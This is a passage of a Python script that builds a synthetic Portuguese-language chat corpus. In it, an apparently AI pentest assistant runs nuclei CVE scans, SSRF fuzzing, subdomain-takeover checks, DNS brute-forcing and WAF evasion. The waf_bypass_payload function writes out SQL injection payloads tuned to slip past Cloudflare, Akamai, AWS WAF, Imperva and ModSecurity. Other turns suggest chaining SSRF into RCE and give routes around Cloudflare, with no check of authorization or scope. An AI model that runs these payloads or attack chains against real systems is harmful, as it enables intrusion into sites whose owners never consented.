        msg("user", f"Checa CVEs conhecidos em {url}."),
        msg("assistant",
            tc("shell", cmd=f"nuclei -u {url} -t cves/ -c 20 -rl 30 -o nuclei_cves.txt")),
        msg("tool",
            "[CVE-2021-41773] [critical] http://target — Apache 2.4.49 Path Traversal\n"
            "[CVE-2022-22947] [critical] http://target — Spring Cloud Gateway RCE"),
        msg("assistant", "Dois criticals. Path traversal já é RCE via same CVE. Confirma manual antes de reporting."),
    ]


def pd_nuclei_fuzz(url: str) -> list[dict]:
    return [
        msg("user", f"Active fuzzing com templates custom em {url}."),
        msg("assistant",
            "NucleiFuzzer wraps nuclei + fuzzing templates + waybackurls feed.\n"
            + tc("shell", cmd=f"NucleiFuzzer -d {url.replace('https://','').replace('http://','')}")),
        msg("tool",
            "[waybackurls] 1847 historical URLs\n"
            "[gau] 423 additional\n"
            "[nuclei-fuzzing-templates] scanning with SSRF/LFI/SQLi/XSS templates...\n"
            "[HIGH] SSRF confirmed on /api/fetch?url="),
        msg("assistant", "SSRF confirmada em param `url`. Gopherus next pra RCE via internal Redis se houver."),
    ]


def pd_katana_crawl(url: str) -> list[dict]:
    return [
        msg("user", f"Crawl deep do {url} com JS parsing."),
        msg("assistant",
            tc("shell", cmd=f"katana -u {url} -jc -depth 5 -c 20 -silent -o endpoints.txt")),
        msg("tool", "847 endpoints discovered (includes JS-derived)"),
        msg("assistant", "Katana renderiza JS → descobre endpoints dinâmicos que gobuster perde. Esses 847 viram input do ffuf/nuclei."),
    ]


# --- Subdomain discovery tools (~21) ---
def sd_subzy(subs_file: str) -> list[dict]:
    return [
        msg("user", f"Quais subs de {subs_file} podem sofrer takeover?"),
        msg("assistant",
            tc("shell", cmd=f"subzy run --targets {subs_file} --concurrency 30 --hide_fails")),
        msg("tool", "[+] blog.corp.com — VULNERABLE (Github Pages unclaimed)\n[+] help.corp.com — VULNERABLE (Heroku unclaimed)"),
        msg("assistant", "2 takeovers. Procedimento: reivindica o repo/app no provider → controle total do subdomínio. Report crítico."),
    ]


def sd_subbrute(domain: str) -> list[dict]:
    return [
        msg("user", f"Brute força subdomains em {domain} com wordlist grande."),
        msg("assistant",
            tc("shell", cmd=f"dnsx -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -silent -o bruted.txt")),
        msg("tool", "14,231 resolved"),
        msg("assistant", "Dnsx é mais rápido que subbrute histórico. 14k subdomínios por força bruta — muitos são legit pelos parent-child."),
    ]


def sd_broken_links(url: str) -> list[dict]:
    return [
        msg("user", f"Links quebrados em {url} — potencial takeover."),
        msg("assistant",
            tc("shell", cmd=f"blc {url} -ro --filter-level=3 2>&1 | grep 'BROKEN' | head -20")),
        msg("tool",
            "BROKEN: https://oldcdn.corp.com/assets/logo.png (404 Not Found)\n"
            "BROKEN: https://deprecated.corp.com/api (DNS NXDOMAIN)"),
        msg("assistant", "`deprecated.corp.com` NXDOMAIN = candidato a takeover se o provider (CloudFront/Azure/etc.) não é dele."),
    ]


# --- Pattern matching + Waybackurls (~21) ---
def pm_gf_ssrf(urls_file: str) -> list[dict]:
    return [
        msg("user", f"Filtra URLs em {urls_file} com params suspeitos de SSRF."),
        msg("assistant",
            tc("shell", cmd=f"cat {urls_file} | gf ssrf | head -30")),
        msg("tool", "https://target.com/api/fetch?url=...\nhttps://target.com/proxy?target=...\nhttps://target.com/image?src=..."),
        msg("assistant", "3 candidatos SSRF por pattern matching. Feed pro SSRFmap ou nuclei SSRF templates."),
    ]


def pm_wayback_pipeline(domain: str) -> list[dict]:
    return [
        msg("user", f"Pipeline completa OSINT em {domain}."),
        msg("assistant",
            tc("shell", cmd=f"waybackurls {domain} | sort -u | tee wayback.txt | "
                              f"gf ssrf,xss,sqli,lfi,redirect > patterns.txt && "
                              f"cat wayback.txt | httpx -silent -status-code -mc 200 > live_historical.txt && "
                              f"wc -l wayback.txt patterns.txt live_historical.txt")),
        msg("tool", "wayback.txt: 12,431\npatterns.txt: 287\nlive_historical.txt: 823"),
        msg("assistant", "12k URLs históricas, 287 candidatos a pattern attack, 823 ainda vivas. Prioriza patterns × live = intersecção ~50 URLs worth testing."),
    ]


# --- WAF detection + bypass (~12) ---
def waf_detect(url: str) -> list[dict]:
    return [
        msg("user", f"Que WAF protege {url}?"),
        msg("assistant",
            tc("shell", cmd=f"wafw00f {url} -a 2>&1 | grep 'is behind'")),
        msg("tool", f"The site {url} is behind Cloudflare (Cloudflare Inc.) WAF"),
        msg("assistant",
            "Cloudflare. Bypass common routes:\n"
            "1. Origin IP leak via historical DNS (`dnsrecon -d ... -t brt`) ou CT logs pre-CF\n"
            "2. Headers Cloudflare doesn't validate (`X-Forwarded-For`, `CF-Connecting-IP`)\n"
            "3. Subdomain que escapa CF (pesquisa DNS records não-proxied)"),
    ]


def waf_bypass_payload(waf: str) -> list[dict]:
    return [
        msg("user", f"Payload SQLi pra bypass {waf}."),
        msg("assistant",
            {
                "Cloudflare": "CF filtra `UNION SELECT` mas deixa passar case-randomized + comentários inline:\n"
                              "`/*!50000Union*/ /*!50000Select*/ 1,2,3--`\n"
                              "Também: encoded via JSON escapes: `\\u0055nion`",
                "Akamai": "Akamai é mais rigoroso em path+param. Timing-based blind: `AND IF(SLEEP(5),1,0)` com encoding.",
                "AWS WAF": "WAF managed rules conservadoras. `OR 1=1` clássico bloqueado; `OR 'a'='a' -- -` com space codificado (`%20` → `%0b`) passa.",
                "Imperva": "Bypass via HTTP Parameter Pollution: `?id=1&id=2 UNION SELECT...`. Imperva pega primeiro `id`, backend usa último.",
                "ModSecurity": "CRS rules detectam palavras-chave. Use dialectos: Oracle `/*+ QB_NAME(...) */` comments ao invés de `/* */`.",
            }.get(waf, f"WAF '{waf}' bypass genérico: case random, URL double-encode, comment injection, HPP (parameter pollution).")),
    ]


# --- Big Bounty Recon meta-wrappers (~12) ---
def bbr_full_recon(domain: str) -> list[dict]:
    return [
        msg("user", f"Executa recon completo em {domain}."),
        msg("assistant",
            "Big Bounty Recon empacota várias ferramentas.\n"
            + tc("shell", cmd=f"python3 BigBountyRecon.py -t {domain} -o bbr_{domain}")),
        msg("tool",
            "Running: Shodan, Censys, Bing, DuckDuckGo, Github Code Search, Rapid7 Project Sonar, CRT.sh, Threatcrowd, ...\n"
            "Reports: bbr_report.html"),
        msg("assistant", "HTML report agrega 20+ sources. Não requer API keys pras fontes open, só as premium (Shodan/Censys se tiver)."),
    ]


def bbr_one_liner_recon(domain: str) -> list[dict]:
    return [
        msg("user", f"One-liner recon chain em {domain}."),
        msg("assistant",
            tc("shell", cmd=f"subfinder -d {domain} -silent | httpx -silent -mc 200 | "
                              f"nuclei -t cves/ -t misconfiguration/ -silent -o findings.txt")),
    ]


# --- Public platforms (sem login) (~15) ---
def pp_he_bgp(ip_or_asn: str) -> list[dict]:
    return [
        msg("user", f"Info BGP + ASN de {ip_or_asn}."),
        msg("assistant",
            tc("shell", cmd=f"curl -s 'https://bgp.he.net/ip/{ip_or_asn}' | grep -E '(AS[0-9]+|netname:|country:|Prefix)' | head -10")),
    ]


def pp_c99_subdomainfinder(domain: str) -> list[dict]:
    return [
        msg("user", f"Free subdomain enum via c99.nl pra {domain}."),
        msg("assistant",
            tc("shell", cmd=f"curl -s 'https://subdomainfinder.c99.nl/scans/$(date +%F)/{domain}' | grep -oE '[a-z0-9.-]+\\.{domain}'")),
    ]


def pp_wayback_machine(domain: str) -> list[dict]:
    return [
        msg("user", f"URLs históricas de {domain} via Wayback."),
        msg("assistant",
            tc("shell", cmd=f"curl -s 'http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=text&fl=original&collapse=urlkey' | head -50")),
    ]


WEB_TOOLS = []
_DOMS = ["example.com", "acme.corp", "megacorp.thm", "target.hackingcompany.com",
         "lab.test", "pentest.example.net"]
_SUBS_FILES = ["subs.txt", "subdomains.txt", "all_subs.txt"]
_URLS_FILES = ["urls.txt", "historical.txt", "live.txt"]
_TARGETS = ["http://target.thm", "https://app.corp.com", "http://10.10.45.22"]
_WAFS = ["Cloudflare", "Akamai", "AWS WAF", "Imperva", "ModSecurity"]
_IPS_ASN = ["8.8.8.8", "AS15169", "1.1.1.1", "AS13335", "203.0.113.5"]

for d in _DOMS:
    WEB_TOOLS.append(pd_subfinder(d))
for sf in _SUBS_FILES:
    for _ in range(3):
        WEB_TOOLS.append(pd_httpx(sf))
for url in _TARGETS:
    for _ in range(3):
        WEB_TOOLS.append(pd_nuclei_cves(url))
        WEB_TOOLS.append(pd_nuclei_fuzz(url))
        WEB_TOOLS.append(pd_katana_crawl(url))
for sf in _SUBS_FILES:
    for _ in range(3):
        WEB_TOOLS.append(sd_subzy(sf))
for d in _DOMS:
    WEB_TOOLS.append(sd_subbrute(d))
for url in _TARGETS:
    WEB_TOOLS.append(sd_broken_links(url))
for uf in _URLS_FILES:
    for _ in range(2):
        WEB_TOOLS.append(pm_gf_ssrf(uf))
for d in _DOMS:
    WEB_TOOLS.append(pm_wayback_pipeline(d))
for url in _TARGETS:
    for _ in range(2):
        WEB_TOOLS.append(waf_detect(url))
for w in _WAFS:
    for _ in range(2):
        WEB_TOOLS.append(waf_bypass_payload(w))
for d in _DOMS:
    WEB_TOOLS.append(bbr_full_recon(d))
    WEB_TOOLS.append(bbr_one_liner_recon(d))
for x in _IPS_ASN:
    WEB_TOOLS.append(pp_he_bgp(x))
for d in _DOMS:
    WEB_TOOLS.append(pp_c99_subdomainfinder(d))
    WEB_TOOLS.append(pp_wayback_machine(d))


# ===========================================================================
# Assembly
# ===========================================================================

ALL_V9 = {
    "adaptive_response": ADAPTIVE,
    "opsec_stealth": OPSEC,
    "output_parsing_long": OPLC,
    "engagement_reasoning": ENGAGE_REASON,
    "kali_nav": KALI_NAV,
    "terminal_awareness": TERM_AWARE,
    "browser_research": BROWSER_RESEARCH,
    "web_tools": WEB_TOOLS,
}


def counts():
    return {k: len(v) for k, v in ALL_V9.items()}


if __name__ == "__main__":
    c = counts()
    total = sum(c.values())
    print("v9 corpus:")
    for k, v in c.items():
        print(f"  {k:30s} {v}")
    print(f"  {'TOTAL':30s} {total}")
